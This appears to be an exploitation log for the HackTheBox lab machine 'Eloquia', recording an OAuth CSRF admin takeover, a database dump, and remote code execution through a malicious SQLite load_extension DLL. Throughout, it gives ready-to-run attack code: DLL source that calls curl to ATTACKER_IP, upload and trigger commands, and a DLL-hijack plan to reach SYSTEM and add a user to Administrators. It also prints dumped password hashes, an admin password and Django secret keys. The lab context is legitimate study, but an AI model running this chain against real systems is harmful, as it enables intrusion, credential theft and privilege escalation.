# Eloquia HTB - Full Exploitation Chain

## Current Status

| Phase | Status | Notes |
|-------|--------|-------|
| OAuth CSRF | ✅ **COMPLETE** | Admin web access achieved |
| Database Extraction | ✅ **COMPLETE** | All tables dumped |
| load_extension RCE | ✅ **RCE CONFIRMED** | DLL upload + SQL load_extension |
| Reverse Shell | ❌ **BLOCKED** | Outbound ports 443, 4444 blocked |
| File-Based RCE | ✅ **WORKING** | Write to static/, read via HTTP |
| User Flag | ✅ **OBTAINED** | Via file-based RCE as eloquia\web |
| Privilege Escalation | ⏳ **IN PROGRESS** | Olivia.KAT is potential path |
| Root Flag | ⏳ **PENDING** | - |

### RCE Breakthrough

**SQLite load_extension() is ENABLED!**

The SQL Explorer allows `load_extension()` which can load arbitrary DLLs. Combined with
the unrestricted article banner upload, this gives us RCE:

1. **Upload**: Article banner accepts ANY file extension (including .dll)
2. **Path**: Files upload to `C:\Web\Eloquia\static\assets\images\blog\`
3. **Trigger**: `SELECT load_extension('C:\Web\Eloquia\static\assets\images\blog\evil.dll')`
4. **Result**: DLL's `sqlite3_extension_init()` function executes

**Confirmed working:**
- Marker files created (`/static/pwned.txt`, `/static/dllmain.txt`)
- HTTP callbacks received from target (10.129.244.81)
- Both WinExec and system() work in DLL

## Target Environment

- **OS**: Windows Server (IIS/10.0)
- **Web Path**: `C:\Web\Eloquia\`
- **Database**: SQLite 3.45.1 at `C:\Web\Eloquia\db.sqlite3`
- **Framework**: Django with Grappelli admin
- **Open Ports**: 80 (HTTP), 5985 (WinRM)

## Scripts

| Script | Description |
|--------|-------------|
| `lab_exploit.py` | Phase 1-2: OAuth CSRF + DB extraction |
| `load_extension_rce.py` | **Phase 3: SQLite load_extension RCE** |

## Quick Start

```bash
# Full OAuth exploit + database extraction
python3 lab_exploit.py

# Test specific phase
python3 lab_exploit.py --run-phase 7    # DB extraction only
python3 lab_exploit.py --phases         # Show all phases
```

---

## Phase 1: OAuth CSRF Attack (COMPLETE)

### Vulnerability
Eloquia uses Qooqle as OAuth provider but doesn't validate the `state` parameter, allowing CSRF attacks to link admin's account to attacker's identity.

### Attack Flow
```
1. Register on Eloquia + Qooqle (same credentials)
2. Generate OAuth code from Qooqle (linked to attacker)
3. Create article: <meta refresh> → OAuth callback + attacker's code
4. Report article → Admin bot visits
5. Admin account linked to attacker's Qooqle
6. Login via OAuth → Admin session
```

### Result
- Admin cookies saved to `tmp/admin_cookies.txt`
- Full access to Django admin panel
- Full access to SQL Explorer

---

## Phase 2: Database Extraction (COMPLETE)

### SQL Explorer Access
URL: `http://eloquia.htb/dev/sql-explorer/play/`

### Extracted Data
Location: `tmp/database/`

| Table | Records | Key Data |
|-------|---------|----------|
| Eloquia_customuser | 17 | Usernames, password hashes, OAuth links |
| Eloquia_article | 44+ | Articles with content |
| django_session | 826 | Active session tokens |
| explorer_databaseconnection | 1 | Encrypted DB password |

### High-Value Credentials Found

**Superuser Accounts:**
```
admin:pbkdf2_sha256$720000$gOf8IANRduHfMKSJBF6lxr$i8gRr6EY+rn05XMFeHexWEk36RCLgtsawMXMKgwIgZ4=
Olivia.KAT:pbkdf2_sha256$720000$l0PVHno3vDtBJLVyPRaKhM$Yu/cqsv51M7IM74zIgz2d3Zeec0frPXT/ulVaVQwr1U=
```

**Hash Format:** Django PBKDF2-SHA256 (720,000 iterations)
**Hashcat Mode:** 10000

---

## Phase 3: RCE via load_extension (SUCCESS)

### Discovery Process

1. **File Upload Analysis**
   - Article banner: ANY extension accepted, but files return HTTP 500
   - User profile: Extension whitelist blocks ASPX
   - Key insight: **Files exist on disk even if HTTP returns 500**

2. **SQL Explorer Analysis**
   - `PRAGMA function_list` revealed `load_extension` is available
   - Test with `SELECT load_extension('test')` → "module not found" (not disabled!)
   - Test with `SELECT load_extension('C:\\Windows\\System32\\kernel32.dll')` → "procedure not found"
   - This means load_extension is **enabled** and tries to find `sqlite3_extension_init`

3. **Exploit Chain**
   ```
   Upload DLL → File on disk (even though HTTP 500)
            ↓
   load_extension('C:\Web\Eloquia\static\assets\images\blog\evil.dll')
            ↓
   sqlite3_extension_init() executes → RCE
   ```

### Working Exploit

```bash
# 1. Compile SQLite extension DLL
cat > shell.c << 'EOF'
#include <windows.h>
__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {
    WinExec("cmd.exe /c curl http://ATTACKER_IP:8888/pwned", 0);
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) { return TRUE; }
EOF
x86_64-w64-mingw32-gcc -shared -o shell.dll shell.c

# 2. Upload via article banner
curl -X POST "http://eloquia.htb/accounts/admin/Eloquia/article/add/" \
  -H "Cookie: csrftoken=TOKEN; sessionid=SESSION" \
  -F "csrfmiddlewaretoken=TOKEN" \
  -F "title=Shell" -F "content=x" -F "author=1" -F "reported=0" \
  -F "banner=@shell.dll" -F "_save=Save"

# 3. Trigger via SQL Explorer
SELECT load_extension('C:\Web\Eloquia\static\assets\images\blog\shell.dll')
```

### Failed Attempts (For Reference)

| Method | Status | Reason |
|--------|--------|--------|
| ASPX via article banner | ❌ | HTTP 500 on /blog/ directory |
| ASPX via user profile | ❌ | Extension whitelist |
| SQL CREATE/INSERT | ❌ | Keyword blacklist |
| ATTACH DATABASE | ❌ | Can attach but can't write data |
| VACUUM INTO | ❌ | Blocked |
| readfile() | ❌ | Function not available |

### What Made This Work

- `load_extension()` reads from **filesystem**, not HTTP
- Blog directory 500 error only affects HTTP serving
- Files uploaded via Django are still written to disk
- SQLite extension entry point `sqlite3_extension_init` allows arbitrary code

---

## Privilege Escalation Path - DLL HIJACKING TO SYSTEM

### Current Access
- **User**: eloquia\web (via file-based RCE)
- **User Flag**: `52b4824c89168a6ab12dc30978e452f7`

---

### CONFIRMED PATH: Failure2Ban DLL Hijacking

#### Target Service
| Property | Value |
|----------|-------|
| Service Name | Failure2Ban |
| **Runs As** | **LocalSystem (SYSTEM!)** |
| Binary | `C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe` |
| **Key Finding** | **Olivia.KAT has WRITE access to Debug directory** |

#### Attack Chain
```
1. Crack Olivia.KAT hash → 2. WinRM as Olivia.KAT → 3. Upload version.dll → 4. Trigger service restart → 5. SYSTEM access
```

---

### SERVICE RESTART TRIGGER MECHANISM

#### How Failure2Ban Works
1. Monitors `C:\Web\Qooqle\log.csv` every 30 seconds
2. After **10 failed login attempts** from same IP, creates firewall rule "Block IP [IP_ADDRESS]"
3. FW-Cleaner.ps1 runs periodically (~5 min) when block rules exist

#### FW-Cleaner.ps1 Script
Location: `C:\Program Files\Automation Scripts\FW-Cleaner.ps1`
```powershell
$rules = Get-NetFirewallRule | Where-Object {$_.Direction -eq 'Inbound' -and $_.DisplayName -like 'Block IP*'}

foreach ($rule in $rules) {
    Remove-NetFirewallRule -Name $rule.Name
}

cmd /c "echo LOG FILE > C:\Web\Qooqle\log.csv"
Restart-Service Failure2Ban          # <-- DLL LOADS HERE AS SYSTEM
rm "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\version.dll"
```

#### Trigger Steps
1. Generate **10 failed logins** to `http://qooqle.htb/login/`
2. Your IP gets blocked via firewall rule
3. Wait ~5 minutes for FW-Cleaner.ps1
4. Service restarts, loading version.dll as SYSTEM
5. DLL executes BEFORE being deleted

#### Log Format
```
C:\Web\Qooqle\log.csv
2025-10-28 10:36:58, username, 192.168.56.1, FAILED
```

---

### OLIVIA.KAT PROFILE (For Wordlist Generation)

#### Account Details
| Field | Value |
|-------|-------|
| Username | Olivia.KAT |
| Email | olivia.k@eloquia.htb |
| Account Created | April 20, 2024 |
| Password Set | 4/20/2024 10:49:00 AM |
| Last Logon | 10/28/2025 11:12:24 AM |
| Groups | Remote Management Users, Users |
| Eloquia Role | Superuser (is_staff=1, is_superuser=1) |

#### Hash to Crack
```
pbkdf2_sha256$720000$l0PVHno3vDtBJLVyPRaKhM$Yu/cqsv51M7IM74zIgz2d3Zeec0frPXT/ulVaVQwr1U=
```
- **Hashcat mode**: 10000
- **Iterations**: 720,000 (slow!)

#### Password Hints
- `.KAT` suffix - could be initials, pet name, or nickname
- `olivia.k` email prefix - last name starts with K
- Admin password pattern: `MyEl0qu!@Admin` (org might use similar patterns)
- Account creation: April 2024

#### Wordlist Ideas
```
# Name variations
Olivia, olivia, OLIVIA, Kat, KAT, kat
OliviaKat, Olivia.KAT, olivia.kat

# Pattern from admin password: MyEl0qu!@Admin
MyEl0qu!@Olivia, El0qu!@Olivia, Eloquia!Olivia

# With years/dates
Olivia2024, Olivia2024!, OliviaKAT2024
KAT2024, Olivia@2024, Olivia0420

# Common patterns
Olivia123, Olivia123!, Olivia!, Olivia@123, KAT123!
```

---

### PREPARED PAYLOAD

#### version.dll Location
```
/home/kali/lab-mixed/tmp/rce_dll/version.dll
```

#### Payload Actions (runs as SYSTEM)
1. Writes root.txt to `C:\Web\Eloquia\static\root.txt`
2. Adds `web` user to Administrators group
3. Creates marker file `C:\Web\Eloquia\static\pwned_system.txt`

---

### EXECUTION COMMANDS

Once password is cracked:
```bash
# 1. Connect as Olivia.KAT
evil-winrm -i eloquia.htb -u 'Olivia.KAT' -p '<PASSWORD>'

# 2. Upload DLL (in evil-winrm)
upload /home/kali/lab-mixed/tmp/rce_dll/version.dll "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\version.dll"

# 3. Trigger failed logins (run 10+ times)
for i in {1..12}; do curl -s -X POST http://qooqle.htb/login/ -d "username=invalid&password=invalid"; done

# 4. Wait ~5 minutes, then check
curl http://eloquia.htb/static/root.txt
curl http://eloquia.htb/static/pwned_system.txt
```

---

### Scheduled Tasks Found

| Task | Run As | Description |
|------|--------|-------------|
| seleniumSimulator | web | Browser bot - visits reported articles |
| Start eloquia.htb | web | Django server (port 8000) |
| Start qooqle.htb | web | Qooqle server (port 8080) |
| clear eloquia.htb query logs | web | Clears SQL Explorer logs |

---

## Network Restrictions

### Outbound Connections BLOCKED

Reverse shells do not work due to firewall rules:
- **Port 4444**: Blocked outbound (standard meterpreter)
- **Port 443**: Blocked outbound (HTTPS reverse shell)
- Other common shell ports likely blocked

### File-Based Command Execution (WORKING)

Since reverse shells are blocked, use file-based RCE:

1. **Write commands via DLL**:
   ```c
   WinExec("cmd.exe /c whoami > C:\\Web\\Eloquia\\static\\output.txt", 0);
   ```

2. **Read output via HTTP**:
   ```bash
   curl http://eloquia.htb/static/output.txt
   ```

This approach works because:
- Write access to `C:\Web\Eloquia\static\`
- Files in `/static/` are served via HTTP
- No outbound connection required

---

## Next Steps

### Priority 1: Crack Olivia.KAT Password

```bash
# Create hash file
echo 'pbkdf2_sha256$720000$l0PVHno3vDtBJLVyPRaKhM$Yu/cqsv51M7IM74zIgz2d3Zeec0frPXT/ulVaVQwr1U=' > olivia_hash.txt

# Run hashcat
hashcat -m 10000 olivia_hash.txt /usr/share/wordlists/rockyou.txt
```

### Priority 2: Test Password Reuse

If hash cracks, test against WinRM:
```bash
evil-winrm -i eloquia.htb -u 'Olivia.KAT' -p 'CRACKED_PASSWORD'
```

### Priority 3: Alternative Enumeration

If password doesn't reuse, continue file-based enumeration:
- Check scheduled task configurations
- Look for credentials in config files
- Enumerate local users and groups

---

## File Structure

```
lab-mixed/
├── lab_exploit.py           # OAuth CSRF + DB extraction
├── load_extension_rce.py    # SQLite load_extension RCE exploit
├── README.md                # This file
├── tmp/
│   ├── admin_cookies.txt    # Admin session (from lab_exploit.py)
│   ├── rce_state.json       # RCE exploit state tracking
│   ├── rce_dll/             # Compiled DLLs
│   ├── username.txt         # Attacker username
│   ├── password.txt         # Attacker password
│   └── database/            # Extracted DB tables
└── delete_later/            # Deprecated scripts
```

---

## Key Findings Summary

1. **OAuth CSRF works** - Admin takeover successful
2. **SQL Explorer access** - Can query all data, DDL/DML blocked BUT load_extension WORKS
3. **load_extension RCE** - SQLite extension loading is enabled, DLLs execute
4. **Database path**: `C:\Web\Eloquia\db.sqlite3`
5. **Web root path**: `C:\Web\Eloquia\`
6. **Target IP**: 10.129.244.81
7. **Two superusers**: admin, Olivia.KAT
8. **Static file paths**:
   - `/static/assets/images/blog/` - HTTP 500 but files exist on disk
   - `/static/assets/images/users_profiles/` - Works normally
   - `/static/` - Writable via DLL RCE

## Attack Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│  Phase 1: OAuth CSRF                                                │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐      │
│  │ Register │───▶│ Get Code │───▶│ Plant    │───▶│ Admin    │      │
│  │ Accounts │    │ Qooqle   │    │ in Article│   │ Takeover │      │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘      │
├─────────────────────────────────────────────────────────────────────┤
│  Phase 2: Database Extraction                                       │
│  ┌──────────┐    ┌──────────┐                                       │
│  │ SQL      │───▶│ Dump All │                                       │
│  │ Explorer │    │ Tables   │                                       │
│  └──────────┘    └──────────┘                                       │
├─────────────────────────────────────────────────────────────────────┤
│  Phase 3: RCE via load_extension                                    │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐      │
│  │ Compile  │───▶│ Upload   │───▶│ load_    │───▶│ Code     │      │
│  │ Evil DLL │    │ via Blog │    │ extension│    │ Execution│      │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## All Credentials Found

| Service | Username | Password/Secret |
|---------|----------|-----------------|
| Eloquia Django Admin | admin | `MyEl0qu!@Admin` |
| Eloquia Django Secret | - | `django-insecure-ez@1xu&_s89*+7dy1+j4ed5nl&u8z_y2yw-se$bz%c9v$z*6v2` |
| Qooqle Django Secret | - | `django-insecure-=(@z=9wilkjmjzc1iufhx=jc=(l#%ud-u!%g#7lbgbdc8*pl$#` |
| OAuth Client ID | Eloquia | `riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi` |
| Olivia.KAT (hash) | Olivia.KAT | `pbkdf2_sha256$720000$l0PVHno3vDtBJLVyPRaKhM$...` |

---

## References

- Django SQL Explorer: https://django-sql-explorer.readthedocs.io/
- SQLite load_extension: https://www.sqlite.org/c3ref/load_extension.html
- mingw-w64 DLL compilation
- PBKDF2 Hash Cracking: hashcat mode 10000
